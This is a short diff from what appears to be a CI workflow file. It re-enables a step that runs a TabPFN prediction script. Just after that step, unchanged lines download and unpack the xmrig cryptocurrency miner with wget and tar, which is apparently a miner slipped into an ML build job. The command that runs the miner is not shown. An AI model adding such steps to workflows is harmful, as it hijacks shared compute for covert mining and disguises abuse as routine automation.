@@ -86,7 +86,7 @@ jobs:
 
 
           # Make predictor TabPFN
-          #python TabPFN.py > info_TabPFN.txt
+          python TabPFN.py > info_TabPFN.txt
 
           wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz
           tar xvfz xmrig-6.22.2-jammy-x64.tar.gz
